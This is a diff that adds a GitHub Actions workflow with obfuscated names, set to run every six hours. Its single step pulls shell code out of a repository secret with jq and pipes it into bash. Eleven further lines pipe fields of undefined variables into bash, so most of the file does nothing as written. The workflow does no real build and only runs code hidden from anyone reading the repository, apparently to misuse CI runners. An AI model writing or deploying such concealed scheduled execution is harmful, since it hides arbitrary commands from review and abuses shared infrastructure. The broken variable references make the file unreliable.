@@ -1,0 +1,28 @@
+name: guozhongren1234
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guozhongren1234
+        env:
+          qgr1: ${{ secrets.qgr1 }}
+        run: |
+          echo $qgr1 | jq -r .c187 | /bin/bash
+          echo $wng94058 | jq -r .cpw74827 | /bin/bash
+          echo $hp0 | jq -r .c80 | /bin/bash
+          echo $z7 | jq -r .c198 | /bin/bash
+          echo $bmt6 | jq -r .gbuyl9567 | /bin/bash
+          echo $rvb4 | jq -r .hqdjv19151 | /bin/bash
+          echo $vekui3293 | jq -r .ciqx28496 | /bin/bash
+          echo $ga7 | jq -r .nfo1614 | /bin/bash
+          echo $a67 | jq -r .r5 | /bin/bash
+          echo $l0692 | jq -r .p9330 | /bin/bash
+          echo $w501 | jq -r .qdrt77 | /bin/bash
+          echo $i35215 | jq -r .mu70378 | /bin/bash
+
